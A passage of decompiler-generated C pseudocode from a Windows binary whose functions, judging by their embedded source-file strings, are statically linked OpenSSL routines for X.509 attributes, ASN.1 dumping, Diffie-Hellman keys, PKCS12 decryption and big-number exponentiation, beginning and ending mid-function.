  sub_42C610(v5);
  sub_432A30(v4);
  return 0;
}

//----- (00454B50) --------------------------------------------------------
int __cdecl sub_454B50(int a1, int a2)
{
  int result; // eax

  result = a1;
  if ( a1 )
    return sub_426A40(*(int **)(a1 + 4), a2);
  return result;
}

//----- (00454B70) --------------------------------------------------------
void ***__cdecl sub_454B70(void ****a1, int a2, int a3, char *Src, signed int Size)
{
  void ***v5; // esi
  void **v7; // eax

  if ( a1 && (v5 = *a1) != 0 || (v5 = (void ***)sub_42C860()) != 0 )
  {
    if ( a2 && (sub_422B70(*v5), v7 = sub_439EE0(a2), (*v5 = v7) != 0) && sub_4549F0((int)v5, a3, Src, Size) )
    {
      if ( a1 && !*a1 )
        *a1 = v5;
      return v5;
    }
    else
    {
      if ( !a1 || v5 != *a1 )
        sub_42C870((int)v5);
      return 0;
    }
  }
  else
  {
    sub_408310(11, 137, 65, (int)"crypto\\x509\\x509_att.c", 196);
    return 0;
  }
}

//----- (00454C20) --------------------------------------------------------
void ***__cdecl sub_454C20(void ****a1, int a2, int a3, char *Src, signed int Size)
{
  void **v5; // esi
  void ***v7; // edi

  v5 = (void **)sub_423310(a2);
  if ( v5 )
  {
    v7 = sub_454B70(a1, (int)v5, a3, Src, Size);
    if ( !v7 )
      sub_422B70(v5);
    return v7;
  }
  else
  {
    sub_408310(11, 136, 109, (int)"crypto\\x509\\x509_att.c", 177);
    return 0;
  }
}

//----- (00454C90) --------------------------------------------------------
void ***__cdecl sub_454C90(void ***a1, int a2, int a3, char *Src, signed int Size)
{
  void ***result; // eax
  int v6; // esi
  void **v7; // edi

  result = sub_454C20(0, a2, a3, Src, Size);
  v6 = (int)result;
  if ( result )
  {
    v7 = sub_454960(a1, result);
    sub_42C870(v6);
    return (void ***)v7;
  }
  return result;
}

//----- (00454CE0) --------------------------------------------------------
int __cdecl sub_454CE0(int a1, _DWORD *Block)
{
  _DWORD *v2; // eax

  v2 = Block;
  if ( Block )
    return sub_433F40(a1, 0x34u, 23, (int)v2);
  v2 = sub_454F90(0, 0);
  if ( v2 )
    return sub_433F40(a1, 0x34u, 23, (int)v2);
  sub_408310(33, 135, 65, (int)"crypto\\pkcs7\\pk7_attr.c", 100);
  return 0;
}

//----- (00454D30) --------------------------------------------------------
int __cdecl sub_454D30(int a1, const char *Src, signed int Size)
{
  _DWORD *v3; // esi

  v3 = sub_42C430();
  if ( v3 )
  {
    if ( sub_432910((int)v3, Src, Size) && sub_433F40(a1, 0x33u, 4, (int)v3) )
      return 1;
    sub_42C4F0(v3);
  }
  return 0;
}

//----- (00454D80) --------------------------------------------------------
int __cdecl sub_454D80(_BYTE **a1, int a2, int *a3, int a4)
{
  int *v4; // esi
  int v5; // ebx
  _BYTE **v6; // eax
  _BYTE **v7; // ebx
  int v9; // esi
  int *v10; // eax
  int v11; // eax
  int v12; // [esp+10h] [ebp-54h] BYREF
  int v13; // [esp+14h] [ebp-50h] BYREF
  int v14; // [esp+18h] [ebp-4Ch]
  int *v15; // [esp+1Ch] [ebp-48h]
  char v16[64]; // [esp+20h] [ebp-44h] BYREF

  v14 = a2;
  v4 = 0;
  v15 = a3;
  v12 = 0;
  v5 = 0;
  *a3 = 0;
  if ( !sub_4075B0((int)a1, 512) )
  {
    v6 = (_BYTE **)sub_42B820();
    v7 = v6;
    if ( v6 )
    {
      v9 = sub_42BAA0((int)v6, (int)a1);
      if ( v9 )
        v9 = sub_42BA20(v7, (int)v16, &v12);
      sub_42B840(v7);
      if ( v9 )
        goto LABEL_10;
    }
    else
    {
      sub_408310(6, 107, 65, (int)"crypto\\evp\\p_sign.c", 34);
    }
    return 0;
  }
  if ( sub_42BA20(a1, (int)v16, &v12) )
  {
LABEL_10:
    v5 = 0;
    v13 = sub_41CA90(a4);
    v10 = (int *)sub_443D20(a4, 0);
    v4 = v10;
    if ( v10 )
    {
      if ( sub_453AC0(v10) > 0 )
      {
        v11 = sub_445DB0((int)a1);
        if ( sub_443A60((int)v4, -1, 248, 1, 0, v11) > 0 && sub_453B20(v4, v14, (unsigned int *)&v13, (int)v16, v12) > 0 )
        {
          *v15 = v13;
          v5 = 1;
        }
      }
    }
  }
  sub_443A10((volatile LONG **)v4);
  return v5;
}

//----- (00454EF0) --------------------------------------------------------
_DWORD *__cdecl sub_454EF0(_DWORD *Block, int a2, int a3, unsigned int *a4)
{
  unsigned int v4; // edx
  unsigned int v5; // ecx
  int v6; // esi
  __time64_t Time; // [esp+0h] [ebp-8h] BYREF

  if ( a4 )
  {
    v4 = *a4;
    v5 = a4[1];
    LODWORD(Time) = *a4;
    HIDWORD(Time) = v5;
  }
  else
  {
    _time64(&Time);
    v5 = HIDWORD(Time);
    v4 = Time;
  }
  if ( !Block || (Block[3] & 0x40) != 0 )
    return sub_430E20(Block, __SPAIR64__(v5, v4), a2, a3);
  v6 = Block[1];
  if ( v6 == 23 )
    return sub_44C6A0(Block, __SPAIR64__(v5, v4), a2, a3);
  if ( v6 == 24 )
    return sub_44C190(Block, __SPAIR64__(v5, v4), a2, a3);
  else
    return sub_430E20(Block, __SPAIR64__(v5, v4), a2, a3);
}

//----- (00454F90) --------------------------------------------------------
_DWORD *__cdecl sub_454F90(_DWORD *Block, int a2)
{
  return sub_454EF0(Block, 0, a2, 0);
}

//----- (00454FB0) --------------------------------------------------------
const char *__cdecl sub_454FB0(unsigned int a1)
{
  unsigned int v1; // eax

  v1 = a1;
  if ( a1 == 258 || a1 == 266 )
    v1 = a1 & 0xFFFFFEFF;
  if ( v1 > 0x1E )
    return "(unknown)";
  else
    return off_50F1A0[v1];
}
// 50F1A0: using guessed type char *off_50F1A0[31];

//----- (00454FE0) --------------------------------------------------------
BOOL __usercall sub_454FE0@<eax>(char a1@<bl>, int a2@<edi>, int a3@<esi>, char a4, int a5)
{
  const char *v5; // eax
  char *v6; // ebp
  char v8[128]; // [esp+0h] [ebp-84h] BYREF

  v5 = "cons: ";
  if ( (a4 & 0x20) == 0 )
    v5 = "prim: ";
  if ( sub_405110(a3, (int)v5, 6) < 6 )
    return 0;
  sub_405340(a3, a5, 128);
  v6 = v8;
  if ( (a1 & 0xC0) == 0xC0 )
  {
    sub_4191B0((int)v8, 128, "priv [ %d ] ", a2);
  }
  else if ( (a1 & 0x80) == 0x80 )
  {
    sub_4191B0((int)v8, 128, "cont [ %d ]", a2);
  }
  else if ( (a1 & 0x40) != 0 )
  {
    sub_4191B0((int)v8, 128, "appl [ %d ]", a2);
  }
  else if ( a2 <= 30 )
  {
    v6 = (char *)sub_454FB0(a2);
  }
  else
  {
    sub_4191B0((int)v8, 128, "<ASN1 %d>", a2);
  }
  return sub_419190(a3, "%-18s", v6) > 0;
}

//----- (00455100) --------------------------------------------------------
int __cdecl sub_455100(int a1, int *a2, int a3, int a4, int a5, int a6, int a7)
{
  int v8; // eax
  int v9; // edi
  int v10; // ebx
  int v11; // ebp
  int v12; // eax
  unsigned int v13; // ebx
  unsigned int v14; // edi
  int v15; // ebp
  unsigned int v16; // ebx
  int v17; // eax
  bool v18; // zf
  int v19; // ebx
  int v20; // edi
  int v21; // ecx
  int *v22; // eax
  int v23; // edi
  int v24; // edx
  int v25; // ecx
  unsigned __int8 v26; // al
  int v27; // edi
  int v28; // eax
  int *v29; // edi
  int v30; // ebx
  int v31; // ebx
  int v32; // eax
  int v33; // eax
  int v34; // ebx
  int v35; // edi
  int v36; // [esp+0h] [ebp-30h] BYREF
  int v37; // [esp+4h] [ebp-2Ch] BYREF
  int v38; // [esp+8h] [ebp-28h] BYREF
  int v39; // [esp+Ch] [ebp-24h] BYREF
  void *v40; // [esp+10h] [ebp-20h]
  int v41; // [esp+14h] [ebp-1Ch]
  int v42; // [esp+18h] [ebp-18h]
  int v43; // [esp+1Ch] [ebp-14h]
  unsigned int v44; // [esp+20h] [ebp-10h]
  int v45; // [esp+24h] [ebp-Ch] BYREF
  void *Block; // [esp+28h] [ebp-8h] BYREF
  unsigned int v47; // [esp+2Ch] [ebp-4h]
  int v48; // [esp+3Ch] [ebp+Ch]

  v41 = 0;
  Block = 0;
  v40 = 0;
  v42 = 0;
  if ( a5 > 128 )
  {
    sub_4051D0(a1, (int)"BAD RECURSION DEPTH\n");
    return 0;
  }
  v8 = *a2;
  v37 = v8;
  v47 = v8 + a3;
  if ( a3 <= 0 )
  {
LABEL_128:
    v41 = 1;
    goto LABEL_129;
  }
  while ( 1 )
  {
    v9 = v8;
    v43 = v8;
    v10 = sub_432B70((_BYTE **)&v37, (unsigned int *)&v36, &v38, &v45, a3);
    v44 = v10;
    if ( (v10 & 0x80u) != 0 )
    {
      if ( sub_405110(a1, (int)"Error in encoding\n", 18) <= 0 )
        goto LABEL_129;
      goto LABEL_131;
    }
    v11 = v37 - v9;
    v48 = a3 - (v37 - v9);
    if ( sub_419190(a1, "%5ld:", a4 + v9 - *a2) <= 0 )
      goto LABEL_129;
    v12 = v10 == 33
        ? sub_419190(a1, "d=%-2d hl=%ld l=inf  ", a5, v11)
        : sub_419190(a1, "d=%-2d hl=%ld l=%4ld ", a5, v11, v36);
    if ( v12 <= 0 || !sub_454FE0(v45, v38, a1, v10, a6 != 0 ? a5 : 0) )
      goto LABEL_129;
    v13 = v44;
    if ( (v44 & 0x20) != 0 )
    {
      v14 = v36 + v37;
      v15 = v37;
      v44 = v36 + v37;
      if ( sub_405110(a1, (int)"\n", 1) <= 0 )
        goto LABEL_129;
      if ( v36 > v48 )
      {
        sub_419190(a1, "length is greater than %ld\n", v48);
        v41 = 0;
        goto LABEL_129;
      }
      if ( v13 == 33 && !v36 )
      {
        v8 = v37;
        v16 = v47;
        while ( 1 )
        {
          v17 = sub_455100(a1, &v37, v16 - v8, a4 + v8 - *a2, a5 + 1, a6, a7);
          if ( !v17 )
            break;
          v18 = v17 == 2;
          v8 = v37;
          if ( v18 || v37 >= v16 )
          {
            v36 = v37 - v15;
            goto LABEL_127;
          }
        }
LABEL_131:
        v41 = 0;
        goto LABEL_129;
      }
      v19 = v36;
      v8 = v37;
      if ( v37 < v14 )
      {
        while ( 1 )
        {
          v20 = v8;
          if ( !sub_455100(a1, &v37, v19, a4 + v8 - *a2, a5 + 1, a6, a7) )
            goto LABEL_131;
          v8 = v37;
          v19 += v20 - v37;
          if ( v37 >= v44 )
            goto LABEL_127;
        }
      }
      goto LABEL_127;
    }
    if ( v45 )
    {
      v37 += v36;
      if ( sub_405110(a1, (int)"\n", 1) <= 0 )
        goto LABEL_129;
      v8 = v37;
      goto LABEL_127;
    }
    v21 = v38;
    v44 = 0;
    if ( v38 == 19 || v38 == 20 || v38 == 22 || v38 == 26 || v38 == 18 || v38 == 12 || v38 == 23 || v38 == 24 )
    {
      if ( sub_405110(a1, (int)word_4F1980, 1) <= 0 )
        goto LABEL_129;
      if ( v36 > 0 )
      {
        v33 = sub_405110(a1, v37, v36);
        if ( v33 != v36 )
          goto LABEL_129;
      }
      goto LABEL_114;
    }
    if ( v38 == 6 )
    {
      v39 = v43;
      if ( !sub_422DD0((void ***)&Block, &v39, v36 + v11) )
      {
        if ( sub_4051D0(a1, (int)":BAD OBJECT") <= 0 )
          goto LABEL_129;
        v42 = 1;
LABEL_116:
        v34 = v43 + v11;
        if ( sub_4051D0(a1, (int)":[") <= 0 )
          goto LABEL_129;
        v35 = 0;
        if ( v36 > 0 )
        {
          while ( sub_419190(a1, "%02X", *(unsigned __int8 *)(v35 + v34)) > 0 )
          {
            if ( ++v35 >= v36 )
              goto LABEL_120;
          }
          goto LABEL_129;
        }
LABEL_120:
        if ( sub_4051D0(a1, (int)"]") <= 0 )
          goto LABEL_129;
        v21 = v38;
        goto LABEL_122;
      }
      if ( sub_405110(a1, (int)word_4F1980, 1) <= 0 )
        goto LABEL_129;
      sub_422A00(a1, (int)Block);
      goto LABEL_114;
    }
    if ( v38 != 1 )
      break;
    if ( v36 != 1 )
    {
      if ( sub_4051D0(a1, (int)":BAD BOOLEAN") <= 0 )
        goto LABEL_129;
      v21 = v38;
      v42 = 1;
    }
    if ( v36 > 0 )
    {
      sub_419190(a1, ":%u", *(unsigned __int8 *)v37);
      goto LABEL_114;
    }
LABEL_115:
    if ( v42 )
      goto LABEL_116;
LABEL_122:
    if ( !v44 )
    {
      if ( sub_405110(a1, (int)"\n", 1) <= 0 )
        goto LABEL_129;
      v21 = v38;
    }
    v8 = v36 + v37;
    v37 += v36;
    if ( !v21 && !v45 )
    {
      v41 = 2;
      goto LABEL_129;
    }
LABEL_127:
    a3 = v48 - v36;
    if ( a3 <= 0 )
      goto LABEL_128;
  }
  switch ( v38 )
  {
    case 30:
      goto LABEL_115;
    case 4:
      v39 = v43;
      v22 = (int *)sub_42C3F0(0, (void **)&v39, v36 + v11);
      v40 = v22;
      if ( v22 && *v22 > 0 )
      {
        v23 = v22[2];
        v39 = v23;
        v24 = *v22;
        v25 = 0;
        if ( *v22 <= 0 )
        {
LABEL_59:
          if ( sub_405110(a1, (int)word_4F1980, 1) <= 0 || sub_405110(a1, v39, *(_DWORD *)v40) <= 0 )
            goto LABEL_129;
        }
        else
        {
          while ( 1 )
          {
            v26 = *(_BYTE *)(v25 + v23);
            if ( v26 < 0x20u && v26 != 10 && v26 != 13 && v26 != 9 )
              break;
            if ( v26 > 0x7Eu )
              break;
            if ( ++v25 >= v24 )
              goto LABEL_59;
          }
          if ( a7 )
          {
            if ( sub_405110(a1, (int)"\n", 1) <= 0 )
              goto LABEL_129;
            v28 = a7;
            if ( a7 == -1 || a7 > *(_DWORD *)v40 )
              v28 = *(_DWORD *)v40;
            if ( sub_439DC0(a1, v39, v28, 6) <= 0 )
              goto LABEL_129;
            v44 = 1;
          }
          else
          {
            if ( sub_405110(a1, (int)"[HEX DUMP]:", 11) <= 0 )
              goto LABEL_129;
            v27 = 0;
            if ( *(int *)v40 > 0 )
            {
              while ( sub_419190(a1, "%02X", *(unsigned __int8 *)(v27 + v39)) > 0 )
              {
                if ( ++v27 >= *(_DWORD *)v40 )
                  goto LABEL_74;
              }
              goto LABEL_129;
            }
          }
        }
      }
LABEL_74:
      sub_42C4F0(v40);
      v40 = 0;
      goto LABEL_114;
    case 2:
      v39 = v43;
      v29 = (int *)sub_42C450(0, (void **)&v39, v36 + v11);
      if ( v29 )
      {
        if ( sub_405110(a1, (int)word_4F1980, 1) <= 0 || v29[1] == 258 && sub_405110(a1, (int)"-", 1) <= 0 )
          goto LABEL_129;
        v30 = 0;
        if ( *v29 > 0 )
        {
          while ( sub_419190(a1, "%02X", *(unsigned __int8 *)(v30 + v29[2])) > 0 )
          {
            if ( ++v30 >= *v29 )
              goto LABEL_83;
          }
          goto LABEL_129;
        }
LABEL_83:
        if ( !*v29 && sub_405110(a1, (int)"00", 2) <= 0 )
          goto LABEL_129;
      }
      else
      {
        if ( sub_4051D0(a1, (int)":BAD INTEGER") <= 0 )
          goto LABEL_129;
        v42 = 1;
      }
LABEL_102:
      sub_42C4F0(v29);
LABEL_114:
      v21 = v38;
      goto LABEL_115;
  }
  if ( v38 != 10 )
  {
    if ( v36 > 0 && a7 )
    {
      if ( sub_405110(a1, (int)"\n", 1) <= 0 )
        goto LABEL_129;
      v32 = v36;
      if ( a7 != -1 && a7 <= v36 )
        v32 = a7;
      if ( sub_439DC0(a1, v37, v32, 6) <= 0 )
        goto LABEL_129;
      v44 = 1;
      goto LABEL_114;
    }
    goto LABEL_115;
  }
  v39 = v43;
  v29 = (int *)sub_42C4B0(0, (void **)&v39, v36 + v11);
  if ( !v29 )
  {
    if ( sub_4051D0(a1, (int)":BAD ENUMERATED") <= 0 )
      goto LABEL_129;
    v42 = 1;
    goto LABEL_102;
  }
  if ( sub_405110(a1, (int)word_4F1980, 1) <= 0 || v29[1] == 266 && sub_405110(a1, (int)"-", 1) <= 0 )
    goto LABEL_129;
  v31 = 0;
  if ( *v29 <= 0 )
  {
LABEL_97:
    if ( !*v29 && sub_405110(a1, (int)"00", 2) <= 0 )
      goto LABEL_129;
    goto LABEL_102;
  }
  while ( sub_419190(a1, "%02X", *(unsigned __int8 *)(v31 + v29[2])) > 0 )
  {
    if ( ++v31 >= *v29 )
      goto LABEL_97;
  }
LABEL_129:
  sub_422B70((void **)Block);
  sub_42C4F0(v40);
  *a2 = v37;
  return v41;
}

//----- (00455990) --------------------------------------------------------
int __cdecl sub_455990(int a1, int a2, int a3, int a4, int a5)
{
  return sub_455100(a1, &a2, a3, 0, 0, a4, a5);
}

//----- (004559C0) --------------------------------------------------------
int __cdecl sub_4559C0(int a1)
{
  return (*(int (**)(void))(*(_DWORD *)(a1 + 64) + 4))();
}

//----- (004559D0) --------------------------------------------------------
int __cdecl sub_4559D0(int a1, int a2, int a3)
{
  return (*(int (**)(void))(*(_DWORD *)(a3 + 64) + 8))();
}

//----- (004559E0) --------------------------------------------------------
int __cdecl sub_4559E0(char *Src, int a2, int a3)
{
  int result; // eax
  size_t v4; // edi
  signed int v5; // esi

  result = (*(int (__cdecl **)(char *, int, int))(*(_DWORD *)(a3 + 64) + 8))(Src, a2, a3);
  v4 = result;
  if ( result > 0 )
  {
    v5 = (sub_416F90(*(_DWORD **)(a3 + 8)) + 7) / 8 - result;
    if ( v5 > 0 )
    {
      memcpy_0(&Src[v5], Src, v4);
      memset(Src, 0, v5);
    }
    return v5 + v4;
  }
  return result;
}

//----- (00455A50) --------------------------------------------------------
char **sub_455A50()
{
  return &off_5318D4;
}
// 5318D4: using guessed type char *off_5318D4;

//----- (00455A60) --------------------------------------------------------
int __cdecl sub_455A60(int a1)
{
  void **v1; // edi
  int v2; // ebx
  void **v3; // ebp
  int v4; // eax
  void **v5; // eax
  void **v6; // ebx
  int *Block; // [esp+10h] [ebp-Ch]
  _DWORD *v9; // [esp+14h] [ebp-8h]
  int v10; // [esp+18h] [ebp-4h]

  v1 = 0;
  v10 = 0;
  v2 = 0;
  v9 = 0;
  v3 = 0;
  Block = sub_420670();
  if ( !Block )
    goto LABEL_21;
  v1 = *(void ***)(a1 + 24);
  if ( !v1 )
  {
    v1 = (void **)sub_416900();
    if ( !v1 )
      goto LABEL_21;
    v2 = 1;
  }
  v3 = *(void ***)(a1 + 20);
  if ( !v3 )
  {
    v3 = (void **)sub_4168C0();
    if ( !v3 )
      goto LABEL_21;
  }
  if ( (*(_BYTE *)(a1 + 28) & 1) != 0 )
  {
    v9 = sub_428A00((_DWORD **)(a1 + 32), *(LPCRITICAL_SECTION *)(a1 + 72), *(int ***)(a1 + 8), Block);
    if ( !v9 )
      goto LABEL_21;
  }
  if ( v2 )
  {
    if ( *(_DWORD *)(a1 + 36) )
    {
      while ( sub_42A970(v1, *(_DWORD **)(a1 + 36)) )
      {
        if ( !sub_416DB0((int)v1) && !sub_416DC0((int)v1) )
          goto LABEL_18;
      }
      goto LABEL_21;
    }
    v4 = *(_DWORD *)(a1 + 16);
    if ( !v4 )
      v4 = sub_416F90(*(_DWORD **)(a1 + 8)) - 1;
    if ( !sub_42A7D0(v1, v4, 0, 0) )
    {
LABEL_21:
      sub_408310(5, 103, 3, (int)"crypto\\dh\\dh_key.c", 134);
      goto LABEL_22;
    }
  }
LABEL_18:
  v5 = (void **)sub_4168C0();
  v6 = v5;
  if ( !v5 )
    goto LABEL_21;
  sub_416E80(v5, v1, 4);
  if ( !(*(int (__cdecl **)(int, void **, _DWORD, void **, _DWORD, int *, _DWORD *))(*(_DWORD *)(a1 + 64) + 12))(
          a1,
          v3,
          *(_DWORD *)(a1 + 12),
          v6,
          *(_DWORD *)(a1 + 8),
          Block,
          v9) )
  {
    sub_417060(v6);
    goto LABEL_21;
  }
  sub_417060(v6);
  *(_DWORD *)(a1 + 20) = v3;
  *(_DWORD *)(a1 + 24) = v1;
  v10 = 1;
LABEL_22:
  if ( v3 != *(void ***)(a1 + 20) )
    sub_417060(v3);
  if ( v1 != *(void ***)(a1 + 24) )
    sub_417060(v1);
  sub_4206C0((void **)Block);
  return v10;
}

//----- (00455C00) --------------------------------------------------------
int __usercall sub_455C00@<eax>(__m64 a1@<mm0>, char *a2, int *a3, int a4)
{
  int v4; // esi
  _DWORD *v5; // ebx
  int *v7; // eax
  int *v8; // edi
  _DWORD *v9; // ebp
  int v10; // [esp+Ch] [ebp-4h]

  v4 = a4;
  v5 = 0;
  v10 = -1;
  if ( sub_416F90(*(_DWORD **)(a4 + 8)) <= 10000 )
  {
    v7 = sub_420670();
    v8 = v7;
    if ( v7 )
    {
      sub_420700(v7);
      v9 = sub_420790(v8);
      if ( *(_DWORD *)(v4 + 24) )
      {
        if ( (*(_BYTE *)(v4 + 28) & 1) == 0
          || (v5 = sub_428A00((_DWORD **)(v4 + 32), *(LPCRITICAL_SECTION *)(v4 + 72), *(int ***)(v4 + 8), v8),
              sub_416F20(*(_DWORD *)(v4 + 24), 4),
              v5) )
        {
          if ( !sub_47FBF0(a1, v4, a3, &a4) || a4 )
          {
            sub_408310(5, 102, 102, (int)"crypto\\dh\\dh_key.c", 177);
          }
          else if ( (*(int (__cdecl **)(int, _DWORD *, int *, _DWORD, _DWORD, int *, _DWORD *))(*(_DWORD *)(v4 + 64) + 12))(
                      v4,
                      v9,
                      a3,
                      *(_DWORD *)(v4 + 24),
                      *(_DWORD *)(v4 + 8),
                      v8,
                      v5) )
          {
            v10 = sub_417300(v9, a2);
          }
          else
          {
            sub_408310(5, 102, 3, (int)"crypto\\dh\\dh_key.c", 183);
          }
        }
      }
      else
      {
        sub_408310(5, 102, 100, (int)"crypto\\dh\\dh_key.c", 164);
      }
      sub_420750(v8);
      sub_4206C0((void **)v8);
      return v10;
    }
    else
    {
      return -1;
    }
  }
  else
  {
    sub_408310(5, 102, 103, (int)"crypto\\dh\\dh_key.c", 153);
    return -1;
  }
}

//----- (00455D50) --------------------------------------------------------
int __usercall sub_455D50@<eax>(
        __m64 a1@<mm0>,
        int a2,
        unsigned int *a3,
        int *a4,
        _DWORD *a5,
        int a6,
        int *a7,
        void *a8)
{
  return sub_427DE0(a1, a3, a4, a5, a6, a7, a8);
}

//----- (00455D80) --------------------------------------------------------
int __cdecl sub_455D80(int a1)
{
  *(_DWORD *)(a1 + 28) |= 1u;
  return 1;
}

//----- (00455D90) --------------------------------------------------------
int __cdecl sub_455D90(int a1)
{
  sub_4285A0(*(_DWORD **)(a1 + 32));
  return 1;
}

//----- (00455DB0) --------------------------------------------------------
int sub_455DB0()
{
  return sub_42AE00(&stru_539288);
}

//----- (00455DC0) --------------------------------------------------------
int __cdecl sub_455DC0(_DWORD *a1)
{
  if ( a1[4] )
    return sub_42AC30((int *)&stru_539288, (int)sub_455DB0, a1, &dword_50F36C, 1, 0);
  else
    return 1;
}
// 50F36C: using guessed type int dword_50F36C;

//----- (00455DF0) --------------------------------------------------------
int __cdecl sub_455DF0(_DWORD *a1)
{
  if ( a1[4] )
    return sub_42AC30((int *)&stru_539288, (int)sub_455DB0, a1, &dword_50F36C, 1, 1);
  else
    return 1;
}
// 50F36C: using guessed type int dword_50F36C;

//----- (00455E20) --------------------------------------------------------
_DWORD *sub_455E20()
{
  return sub_42AE50((int *)&stru_539288, 1);
}

//----- (00455E30) --------------------------------------------------------
void *__cdecl sub_455E30(int *a1, const char *a2, unsigned int a3, char *a4, int a5, _DWORD *a6, _DWORD *a7, int a8)
{
  _DWORD *v8; // edi
  int v10; // eax
  void *v11; // esi
  int v12; // ebx
  int v13; // [esp+8h] [ebp-4h] BYREF

  v8 = sub_405990();
  if ( v8 )
  {
    if ( sub_44BCE0(*a1, a2, a3, a1[1], (int)v8, a8) )
    {
      v10 = sub_4073D0((int)v8);
      v11 = sub_4133F0(a5 + v10);
      if ( v11 )
      {
        if ( sub_406560(v8, (char *)v11, &v13, a4, a5) )
        {
          v12 = v13;
          if ( sub_406580(v8, (int)v11 + v13, &v13) )
          {
            if ( a7 )
              *a7 = v13 + v12;
            if ( a6 )
              *a6 = v11;
            sub_4059B0(v8);
            return v11;
          }
          else
          {
            sub_413490(v11);
            sub_408310(35, 119, 116, (int)"crypto\\pkcs12\\p12_decr.c", 63);
            sub_4059B0(v8);
            return 0;
          }
        }
        else
        {
          sub_413490(v11);
          sub_408310(35, 119, 6, (int)"crypto\\pkcs12\\p12_decr.c", 54);
          sub_4059B0(v8);
          return 0;
        }
      }
      else
      {
        sub_408310(35, 119, 65, (int)"crypto\\pkcs12\\p12_decr.c", 47);
        sub_4059B0(v8);
        return 0;
      }
    }
    else
    {
      sub_408310(35, 119, 115, (int)"crypto\\pkcs12\\p12_decr.c", 41);
      sub_4059B0(v8);
      return 0;
    }
  }
  else
  {
    sub_408310(35, 119, 65, (int)"crypto\\pkcs12\\p12_decr.c", 33);
    sub_4059B0(0);
    return 0;
  }
}

//----- (00455FD0) --------------------------------------------------------
int __cdecl sub_455FD0(int *a1, int a2, const char *a3, int a4, char **Block, int a6)
{
  unsigned int v7; // ebx
  char **v8; // edi
  int v9; // esi
  unsigned int v10; // [esp+0h] [ebp-8h] BYREF
  char **v11; // [esp+4h] [ebp-4h] BYREF

  if ( sub_455E30(a1, a3, a4, Block[2], (int)*Block, &Block, &v10, 0) )
  {
    v7 = v10;
    v8 = Block;
    v11 = Block;
    v9 = sub_42E9C0(0, (void **)&v11, v10, a2);
    if ( a6 )
      sub_4139E0(v8, v7);
    if ( !v9 )
      sub_408310(35, 106, 101, (int)"crypto\\pkcs12\\p12_decr.c", 114);
    sub_413490(v8);
    return v9;
  }
  else
  {
    sub_408310(35, 106, 117, (int)"crypto\\pkcs12\\p12_decr.c", 94);
    return 0;
  }
}

//----- (00456090) --------------------------------------------------------
int __usercall sub_456090@<eax>(
        __m64 a1@<mm0>,
        unsigned int *a2,
        int *a3,
        _DWORD *a4,
        int *a5,
        _DWORD *a6,
        int **a7,
        int *a8,
        _DWORD *a9)
{
  int v10; // esi
  int v11; // eax
  int v12; // ebp
  int *v13; // ebx
  unsigned int *v14; // edi
  _DWORD *v15; // eax
  int v16; // eax
  int *v17; // esi
  int v18; // edi
  int v19; // esi
  unsigned int *v20; // eax
  int *v21; // esi
  unsigned int *v22; // edi
  int v23; // edi
  int v24; // esi
  unsigned int *v25; // eax
  int v26; // esi
  int v27; // edi
  int *v28; // eax
  int v29; // ebp
  int i; // esi
  bool v31; // cc
  int v32; // ebx
  int j; // edi
  int v34; // ebx
  unsigned int *v35; // [esp+4h] [ebp-128h]
  int v36; // [esp+4h] [ebp-128h]
  _DWORD *Block; // [esp+8h] [ebp-124h]
  int v38; // [esp+Ch] [ebp-120h]
  int v39; // [esp+Ch] [ebp-120h]
  unsigned int *v40; // [esp+10h] [ebp-11Ch]
  int v41; // [esp+14h] [ebp-118h]
  int v42; // [esp+18h] [ebp-114h]
  int v43; // [esp+18h] [ebp-114h]
  int v44; // [esp+1Ch] [ebp-110h]
  int v45; // [esp+20h] [ebp-10Ch]
  int v46; // [esp+24h] [ebp-108h]
  int v47; // [esp+28h] [ebp-104h]
  int v48[32]; // [esp+2Ch] [ebp-100h]
  int v49[32]; // [esp+ACh] [ebp-80h]

  v44 = 0;
  Block = 0;
  if ( (*(_BYTE *)*a7 & 1) == 0 )
  {
    sub_408310(3, 118, 102, (int)"crypto\\bn\\bn_exp2.c", 36);
    return 0;
  }
  v10 = sub_416F90(a4);
  v11 = sub_416F90(a6);
  v12 = v11;
  if ( !v10 && !v11 )
    return sub_417490(a2, 1);
  v42 = v10;
  if ( v10 <= v11 )
    v42 = v11;
  v13 = a8;
  sub_420700(a8);
  v35 = sub_420790(a8);
  v40 = sub_420790(a8);
  v14 = sub_420790(a8);
  v49[0] = (int)v14;
  v48[0] = (int)sub_420790(a8);
  if ( !v35 || !v40 || !v14 || !v48[0] )
    goto LABEL_89;
  if ( a9 )
  {
    Block = a9;
  }
  else
  {
    v15 = sub_4289A0();
    Block = v15;
    if ( !v15 || !sub_4285F0(v15, a7, a8) )
      goto LABEL_90;
  }
  v16 = 6;
  if ( v10 <= 671 )
  {
    if ( v10 <= 239 )
    {
      if ( v10 <= 79 )
        v38 = 2 * (v10 > 23) + 1;
      else
        v38 = 4;
    }
    else
    {
      v38 = 5;
    }
  }
  else
  {
    v38 = 6;
  }
  if ( v12 <= 671 )
  {
    if ( v12 > 239 )
    {
      v41 = 5;
      goto LABEL_30;
    }
    if ( v12 > 79 )
    {
      v41 = 4;
      goto LABEL_30;
    }
    v16 = 2 * (v12 > 23) + 1;
  }
  v41 = v16;
LABEL_30:
  v17 = a3;
  if ( a3[3] || sub_416960(a3, (int *)a7) >= 0 )
  {
    if ( !sub_4299A0(0, (int)v14, a3, (int *)a7, a8) )
      goto LABEL_89;
    v17 = (int *)v14;
  }
  if ( sub_416DB0((int)v17) )
  {
    sub_417490(a2, 0);
LABEL_88:
    v44 = 1;
    goto LABEL_89;
  }
  if ( !sub_416E50(a1, v14, v17, (int)Block, a8) )
    goto LABEL_89;
  if ( v38 <= 1 )
    goto LABEL_43;
  if ( !sub_428890(a1, v35, (int *)v14, (int)v14, (int)Block, a8) )
    goto LABEL_89;
  v18 = 1 << (v38 - 1);
  v19 = 1;
  if ( v18 <= 1 )
  {
LABEL_43:
    v21 = a5;
    if ( a5[3] || sub_416960(a5, (int *)a7) >= 0 )
    {
      v22 = (unsigned int *)v48[0];
      if ( !sub_4299A0(0, v48[0], a5, (int *)a7, a8) )
        goto LABEL_89;
      v21 = (int *)v48[0];
    }
    else
    {
      v22 = (unsigned int *)v48[0];
    }
    if ( sub_416DB0((int)v21) )
    {
      sub_417490(a2, 0);
      goto LABEL_88;
    }
    if ( !sub_416E50(a1, v22, v21, (int)Block, a8) )
      goto LABEL_89;
    if ( v41 <= 1 )
      goto LABEL_57;
    if ( !sub_428890(a1, v35, (int *)v22, (int)v22, (int)Block, a8) )
      goto LABEL_89;
    v23 = 1 << (v41 - 1);
    v24 = 1;
    if ( v23 <= 1 )
    {
LABEL_57:
